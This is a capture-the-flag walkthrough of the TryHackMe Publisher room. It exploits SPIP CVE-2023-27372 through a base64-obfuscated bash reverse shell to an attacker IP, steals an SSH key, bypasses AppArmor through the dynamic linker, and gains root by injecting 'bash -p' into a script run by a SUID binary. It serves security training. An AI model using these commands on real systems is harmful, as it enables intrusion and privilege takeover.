# :globe_with_meridians: SPIP RCE + Docker SUID Escape | THM Publisher

---

# SPIP RCE + Docker SUID Escape | THM Publisher

Hello Friend,

Welcome to another TryHackMe challenge [Publisher](https://tryhackme.com/room/publisher)

Step 1 — Nmap Reconnaissance

We begin with an aggressive Nmap scan to identify open ports and running services on the target machine.

*Nmap Result*

The HTTP title reveals SPIP CMS is running — this is a known vulnerable CMS. Version enumeration is the next priority.

Step 2 — Web Enumeration (FFUF)

Navigate to the web server. The homepage shows a SPIP-based Community Magazine. We run directory fuzzing to find hidden paths.

```
ffuf -u http://10.65.183.106/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt
```

*Fuzzing with FUZZ to find the hidden directory and files*Step 3 — Version Detection (Whatweb)

We use WhatWeb to fingerprint the exact version of SPIP running on the target.

```
whatweb http://10.65.183.106/spip
```

*version detection*

SPIP 4.2.0 is confirmed. This version is vulnerable to [CVE -2023–27372](https://github.com/nuts7/CVE-2023-27372) an unauthenticated remote code execution vulnerability via the oubli parameter in the password reset form. this github link contain the exploitaion code with usage.

Step 4 — RCE via CVE-2023–27372

We use a public Python exploit to gain initial remote code execution as www-data.

```
python CVE-2023-27372.py -u http://10.64.179.228/spip -c 'echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEzOS4yMTEvNDQ0NCAwPiYx|base64 -d>shell.php'
```

Confirm code execution by testing the id command via the page parameter:

*RCE*

We have remote code execution as www-data. Next we enumerate the system for privilege escalation paths.

Step 5 — LFI & system enumeration

Using the RCE, we read /etc/passwd to identify users on the system.

*/etc/passwd*

User ‘think’ exists with UID 1000 — a regular user with a home directory at /home/think. Likely has SSH access. We check if think has an exposed SSH private key:

*id_rsa key found*Step 6 — SSH Access as think

## Get Cyb3rV0lt’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

Read the private key using RCE, save it locally, set permissions, and SSH in:

*logged in as think user*

think user contain the user flag in user.txt

Step 7 — Privilege escaltion Enumeration

Now we hunt for a path to root. We search for SUID binaries:

*SUID binaries*

in this `/usr/sbin/run_conatainer` is a custom binary which looks like suspicious! . We use strings to reveal what the binary executes internally:

The SUID binary run_container calls /opt/run_container.sh — if we can write to that script, we can execute commands as root.

Step 8 — SUID Escape to Root

Execute run_container to understand its behavior:

```
cd /opt && run_container
List of Docker containers:
ID: 41c976e507f8 | Name: jovial_hertz | Status: Up 4 hours
```

```
OPTIONS: 1) Start 2) Stop 3) Restart 4) Create 5) Quit
```

Escape via Dynamic Linker : We use the dynamic linker/loader to invoke bash bypassing AppArmor restrictions

```
/lib/x86_64-linux-gnu/ld-linux-x86–64.so.2 /bin/bash
```

This directly invokes the dynamic linker to load /bin/bash, circumventing AppArmor profile restrictions on the container binary.

Inject Shell into run_container.sh : Append a bash -p (privileged shell) command to the script, then trigger via the SUID binary

```
echo 'bash -p' >> /opt/run_container.sh
run_container
# Select option 1 (Start Container)
```

```
bash-5.0# whoami
root
```

*root*

in /root/root.txt we will find the final flag.

Thank you for reading. If you wnat learn about the fuzzing read this blog

If this helped you, connect with me:

Twitter/X : [https://x.com/cybervolt07](https://x.com/cybervolt07)

YouTube: [https://www.youtube.com/@cybervolt07](https://www.youtube.com/@cybervolt07)

Like • Share • Subscribe for more CTF walkthroughs!

---
